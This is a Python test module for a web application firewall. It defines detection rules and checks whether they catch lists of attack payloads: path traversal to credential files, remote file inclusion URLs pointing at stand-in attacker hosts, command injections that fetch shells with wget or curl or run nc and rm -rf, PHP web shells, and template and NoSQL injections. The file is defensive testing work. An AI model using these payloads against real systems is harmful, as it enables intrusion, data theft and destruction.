"""Comprehensive tests for various injection attacks.

This module tests protection against Local File Inclusion (LFI), Remote File Inclusion (RFI),
Command Injection, and other common injection attack vectors using CRS rules.
"""

import pytest

from lewaf.integration import WAF


class TestInjectionAttacks:
    """Test detection and prevention of various injection attacks."""

    @pytest.fixture
    def injection_waf(self):
        """Create WAF instance with injection protection rules."""
        rules = [
            # Local File Inclusion (LFI) detection
            'SecRule ARGS "@rx (?i)(?:\\.{2,}[/\\\\]+){2,}" '
            '"id:930100,phase:2,block,capture,'
            "msg:'Path Traversal Attack (/../)',"
            "severity:'CRITICAL'\"",
            # Unix LFI patterns
            'SecRule ARGS "@rx (?i)(?:/etc/passwd|/etc/shadow|/etc/hosts|/proc/self/environ)" '
            '"id:930110,phase:2,block,capture,'
            "msg:'Unix File Access Attempt',"
            "severity:'CRITICAL'\"",
            # Windows LFI patterns
            'SecRule ARGS "@rx (?i)(?:c:\\\\windows\\\\|system32|boot\\.ini|win\\.ini)" '
            '"id:930120,phase:2,block,capture,'
            "msg:'Windows File Access Attempt',"
            "severity:'CRITICAL'\"",
            # Remote File Inclusion (RFI) detection
            'SecRule ARGS "@rx (?i)(?:https?|ftp|ftps)://[^\\s]*" '
            '"id:931100,phase:2,block,capture,'
            "msg:'Remote File Inclusion Attack',"
            "severity:'CRITICAL'\"",
            # Command injection detection
            'SecRule ARGS "@rx (?i)(?:[;&|]|\\\\|`|\\$\\(|\\${)" '
            '"id:932100,phase:2,block,capture,'
            "msg:'Command Injection Attack',"
            "severity:'CRITICAL'\"",
            # Unix command patterns
            'SecRule ARGS "@rx (?i)(?:cat|ls|ps|id|pwd|whoami|uname|netstat|ifconfig|wget|curl)\\s" '
            '"id:932110,phase:2,block,capture,'
            "msg:'Unix Command Injection',"
            "severity:'CRITICAL'\"",
            # Windows command patterns
            'SecRule ARGS "@rx (?i)(?:cmd|powershell|dir|type|net\\s|tasklist|systeminfo)\\s" '
            '"id:932120,phase:2,block,capture,'
            "msg:'Windows Command Injection',"
            "severity:'CRITICAL'\"",
            # PHP injection detection
            'SecRule ARGS "@rx (?i)(?:<?php|<\\?=|\\beval\\s*\\(|\\bassert\\s*\\(|\\bexec\\s*\\()" '
            '"id:933100,phase:2,block,capture,'
            "msg:'PHP Injection Attack',"
            "severity:'CRITICAL'\"",
            # LDAP injection detection
            'SecRule ARGS "@rx (?i)(?:\\*\\)|\\(\\||&\\(|\\)\\(|\\|\\()" '
            '"id:934100,phase:2,block,capture,'
            "msg:'LDAP Injection Attack',"
            "severity:'HIGH'\"",
        ]

        return WAF({"rules": rules})

    def test_path_traversal_attacks(self, injection_waf):
        """Test Local File Inclusion and path traversal attacks."""
        lfi_vectors = [
            # Basic path traversal
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "....//....//....//etc//passwd",
            # URL encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\windows\\\\system32\\\\config\\\\sam",
            # Double URL encoded
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode encoding
            "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
            # Null byte injection (historical)
            "../../../etc/passwd%00",
            "../../../etc/passwd\\x00.jpg",
            # Deep traversal
            "../" * 10 + "etc/passwd",
            "..\\\\" * 10 + "windows\\\\system32\\\\config\\\\sam",
            # Mixed separators
            "..\\\\../..\\\\../..\\\\../etc/passwd",
            "../..\\\\../..\\\\../etc/passwd",
            # Absolute paths
            "/etc/passwd",
            "C:\\\\windows\\\\system32\\\\config\\\\sam",
            "/proc/self/environ",
            "/proc/version",
            # Log files
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/error.log",
            "C:\\\\inetpub\\\\logs\\\\LogFiles\\\\W3SVC1\\\\",
            # Application-specific files
            "../../../etc/apache2/apache2.conf",
            "../../../etc/nginx/nginx.conf",
            "..\\\\..\\\\..\\\\xampp\\\\apache\\\\conf\\\\httpd.conf",
        ]

        detected_count = 0
        for attack in lfi_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/download?file={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is not None:
                detected_count += 1
            else:
                print(f"Warning: LFI attack not detected: {attack}")

        # Require at least 80% detection rate for LFI attacks
        detection_rate = detected_count / len(lfi_vectors)
        assert detection_rate >= 0.8, (
            f"Low detection rate for LFI attacks: {detection_rate:.1%}"
        )

    def test_remote_file_inclusion(self, injection_waf):
        """Test Remote File Inclusion attacks."""
        rfi_vectors = [
            # Basic RFI
            "http://evil.com/shell.php",
            "https://malicious.site/backdoor.php",
            "ftp://attacker.com/exploit.php",
            # RFI with parameters
            "http://evil.com/shell.php?cmd=id",
            "https://attack.site/webshell.php?c=whoami",
            # Protocol variations
            "HTTP://evil.com/shell.php",
            "HTTPS://malicious.site/backdoor.php",
            "FTP://attacker.com/exploit.php",
            # URL with authentication
            "http://user:pass@evil.com/shell.php",
            "https://admin:admin@attack.site/webshell.php",
            # Data URLs (if processed as remote)
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",  # <?php system($_GET['cmd']);?>
            # Mixed with LFI
            "http://evil.com/shell.txt%00",
            "https://attack.site/../../../shell.php",
            # Using IP addresses
            "http://192.168.1.100/shell.php",
            "https://10.0.0.1:8080/backdoor.php",
            # Non-standard ports
            "http://evil.com:8888/shell.php",
            "https://attack.site:9999/webshell.php",
        ]

        for attack in rfi_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/include?page={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            assert tx.interruption is not None, f"Failed to detect RFI attack: {attack}"

    def test_command_injection_attacks(self, injection_waf):
        """Test OS command injection attacks."""
        command_vectors = [
            # Basic command chaining
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            # Windows command chaining
            "& dir C:\\\\",
            "&& type C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "| dir",
            # Command substitution
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "${cat /etc/passwd}",
            # Windows command substitution
            "`dir`",
            "$(dir)",
            # Backtick variations
            "\\`id\\`",
            "\\`whoami\\`",
            "\\`ps aux\\`",
            # URL encoded command injection
            "%3B%20cat%20%2Fetc%2Fpasswd",  # ; cat /etc/passwd
            "%7C%20id",  # | id
            # Double encoded
            "%253B%2520cat%2520%252Fetc%252Fpasswd",
            # Newline injection
            "\\ncat /etc/passwd",
            "\\r\\ndir C:\\\\",
            "%0Acat /etc/passwd",
            "%0D%0Adir",
            # Time-based command injection
            "; sleep 10",
            "&& ping -c 4 127.0.0.1",
            "| timeout 5",
            # File manipulation
            "; rm -rf /tmp/*",
            "&& del C:\\\\temp\\\\*",
            "| touch /tmp/pwned",
            # Network commands
            "; wget http://evil.com/shell.php",
            "&& curl -O http://attack.site/backdoor.php",
            "| nc -l 4444",
            # Information gathering
            "; uname -a",
            "&& systeminfo",
            "| whoami",
            "; id",
            "&& net user",
        ]

        detected_count = 0
        for attack in command_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/system?cmd=ping localhost{attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is not None:
                detected_count += 1
            else:
                print(f"Warning: Command injection not detected: {attack}")

        # Require high detection rate for command injection
        detection_rate = detected_count / len(command_vectors)
        assert detection_rate >= 0.7, (
            f"Low detection rate for command injection: {detection_rate:.1%}"
        )

    def test_php_injection_attacks(self, injection_waf):
        """Test PHP code injection attacks."""
        php_vectors = [
            # Basic PHP injection
            "<?php system('id'); ?>",
            "<?php echo shell_exec('whoami'); ?>",
            "<?= system('cat /etc/passwd') ?>",
            # PHP functions
            "eval('system(\"id\");')",
            "assert('system(\"whoami\");')",
            "exec('cat /etc/passwd')",
            "shell_exec('ls -la')",
            "passthru('uname -a')",
            "popen('ps aux', 'r')",
            # PHP with mixed case
            "<?PHP system('id'); ?>",
            "<?pHp echo 'pwned'; ?>",
            # PHP short tags
            "<? system('id'); ?>",
            "<? echo `whoami`; ?>",
            # PHP concatenated
            "<?php sys" + "tem('id'); ?>",
            # URL encoded PHP
            "%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E",
            # PHP in other contexts
            "file.php?<?php system('id'); ?>",
            "data://text/plain,<?php system('id'); ?>",
            # Variable PHP injection
            "${@eval('system(\"id\");')}",
            "${system('whoami')}",
            # PHP filter bypass attempts
            "php://input",
            "php://filter/read=convert.base64-encode/resource=index.php",
        ]

        for attack in php_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/eval?code={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is None:
                print(f"Warning: PHP injection not detected: {attack}")

    def test_ldap_injection_attacks(self, injection_waf):
        """Test LDAP injection attacks."""
        ldap_vectors = [
            # Basic LDAP injection
            "*)",
            "*)(&",
            "*))%00",
            # LDAP filter injection
            ")(|(password=*))",
            ")(|(uid=*))",
            ")(&(password=*)(&",
            # Wildcard injection
            "*)(uid=*)(&(uid=*",
            "*)(cn=*)(&(cn=*",
            # Boolean-based LDAP injection
            "admin)(&(password=*)(",
            "user)(|(uid=admin))",
            # LDAP enumeration
            "*)((objectClass=*)",
            "*)((uid=*)",
            "*)((cn=*)",
            # Null byte injection
            "*))%00(cn=*",
            "admin))%00(password=*",
            # Comment injection
            "*))#",
            "admin))#",
            # Nested injection
            "*)((uid=*)((password=*)))",
        ]

        for attack in ldap_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/ldap?search={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is None:
                print(f"Warning: LDAP injection not detected: {attack}")

    def test_template_injection(self, injection_waf):
        """Test Server-Side Template Injection (SSTI) attacks."""
        # These would need additional rules not in the basic set
        ssti_vectors = [
            # Jinja2/Python
            "{{7*7}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.items()}}",
            # Twig/PHP
            "{{7*7}}",
            '{{_self.env.registerUndefinedFilterCallback("exec")}}',
            # Smarty/PHP
            "{php}echo `id`;{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",true)}",
            # Velocity/Java
            "#set($str=$class.forName('java.lang.Runtime').getRuntime().exec('whoami'))",
            # Freemarker/Java
            "${'freemarker.template.utility.Execute'?new()('id')}",
        ]

        for attack in ssti_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/template?data={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            # SSTI detection would require specific rules
            if tx.interruption is None:
                print(
                    f"Info: SSTI vector not detected (may need specific rules): {attack}"
                )

    def test_nosql_injection(self, injection_waf):
        """Test NoSQL injection attacks."""
        # These would need additional rules not in the basic set
        nosql_vectors = [
            # MongoDB injection
            "'; return true; var a = '",
            "\\'; return true; var a = \\'",
            "1; return true",
            # JSON injection
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            # JavaScript in MongoDB
            "function() { return true; }",
            "function() { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date<10000); return Math.max(); }",
            # Blind NoSQL injection
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "return true"}',
        ]

        for attack in nosql_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/mongo?query={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            # NoSQL injection detection would require specific rules
            if tx.interruption is None:
                print(
                    f"Info: NoSQL injection not detected (may need specific rules): {attack}"
                )

    def test_false_positives_prevention(self, injection_waf):
        """Test that legitimate content is not blocked as injection attacks."""
        legitimate_requests = [
            # Normal file operations
            "/download?file=document.pdf",
            "/view?path=images/photo.jpg",
            "/include?page=about.html",
            # Legitimate system discussions
            "/forum?topic=How to configure database settings",
            "/tutorial?lesson=Understanding file permissions",
            "/help?section=Windows explorer basics",
            # Normal URLs and links
            "/redirect?url=github.com/project/repo",
            "/proxy?target=api.example.com/data",
            "/fetch?source=files.company.com/public/",
            # Code examples and documentation
            "/docs?example=Basic web development tutorial",
            "/guide?code=Java programming examples",
            "/reference?snippet=JavaScript function examples",
            # Normal punctuation in different contexts
            "/search?q=C++ programming (basics & advanced)",
            "/comment?text=Great article! I'll bookmark this.",
            "/profile?bio=Developer and Designer Consultant",
        ]

        for request in legitimate_requests:
            tx = injection_waf.new_transaction()
            tx.process_uri(request, "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            assert tx.interruption is None, f"False positive detected for: {request}"

    def test_mixed_injection_attacks(self, injection_waf):
        """Test attacks that combine multiple injection techniques."""
        mixed_vectors = [
            # LFI + Command injection
            "../../../etc/passwd; cat /etc/shadow",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam & dir",
            # RFI + Command injection
            "http://evil.com/shell.php; wget http://evil.com/backdoor.php",
            # PHP + Command injection
            "<?php system($_GET['cmd']); ?>?cmd=id",
            # SQL + Command injection (if both are processed)
            "'; DROP TABLE users; --; cat /etc/passwd",
            # XSS + LFI (polyglot)
            "<script>alert('XSS')</script>/../../../etc/passwd",
            # Multiple encoding layers
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%253B%2520cat%2520%252Fetc%252Fshadow",
        ]

        for attack in mixed_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/vulnerable?input={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is None:
                print(f"Warning: Mixed injection attack not detected: {attack}")

    def test_injection_in_different_parameters(self, injection_waf):
        """Test injection attacks in various parameter contexts."""
        attack_contexts = [
            # In different HTTP methods
            ("GET", "/api?file=../../../etc/passwd"),
            ("POST", "/upload?name=../../../etc/passwd"),
            # In different parameter positions
            ("GET", "/app?user=admin&file=../../../etc/passwd&format=json"),
            ("GET", "/app?file=../../../etc/passwd&user=admin&format=json"),
            # In array parameters
            ("GET", "/process?files[]=../../../etc/passwd"),
            ("GET", "/batch?cmd[]=id&cmd[]=whoami"),
            # In nested parameters
            ("GET", "/api?config[database][host]=; cat /etc/passwd"),
            ("GET", "/settings?user[profile][avatar]=http://evil.com/shell.php"),
        ]

        for method, uri in attack_contexts:
            tx = injection_waf.new_transaction()
            tx.process_uri(uri, method)

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is None:
                print(
                    f"Warning: Injection in {method} parameter context not detected: {uri}"
                )

    def test_encoding_bypass_attempts(self, injection_waf):
        """Test various encoding techniques used to bypass injection detection."""
        bypass_vectors = [
            # Base64 encoding
            ("LFI Base64", "Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="),  # ../../../etc/passwd
            # Hex encoding
            (
                "Command Hex",
                "\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64",
            ),
            # Octal encoding
            (
                "LFI Octal",
                "\\56\\56\\57\\56\\56\\57\\56\\56\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144",
            ),
            # Unicode normalization
            (
                "Unicode LFI",
                "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064",
            ),
            # Mixed encoding
            ("Mixed", "%2e%2e/..\\u002f\\x65tc/passwd"),
        ]

        for attack_type, encoded_attack in bypass_vectors:
            tx = injection_waf.new_transaction()
            tx.process_uri(f"/test?payload={encoded_attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption is None:
                print(
                    f"Warning: {attack_type} encoding bypass not detected: {encoded_attack}"
                )
